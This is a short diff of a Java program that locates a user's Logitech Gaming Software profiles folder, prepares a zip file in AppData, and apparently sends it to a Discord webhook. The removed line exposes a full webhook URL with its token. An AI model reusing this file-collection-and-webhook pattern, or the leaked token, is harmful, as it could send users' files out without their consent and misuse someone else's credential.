@@ -19,7 +19,7 @@ public class Main {
     	String username = System.getProperty("user.name");
         String sourceFolderPath = "C:\\Users\\" + username + "\\AppData\\Local\\Logitech\\Logitech Gaming Software\\profiles";
     	
-        String webhookURL = "https://discord.com/api/webhooks/1139578177472172153/2hHeotaa7iwhIPS4PD8tUBQDOlMgRZHnVgvA7SKqCs6OCC4edzkVd6g36Usr633Ik3pR";
+        String webhookURL = "YOUR_WEEBHOOK_URL";
         String zipFilePath = "C:\\Users\\" + username + "\\AppData\\Roaming\\Profiles.zip";
         String ID = "why1337";
 
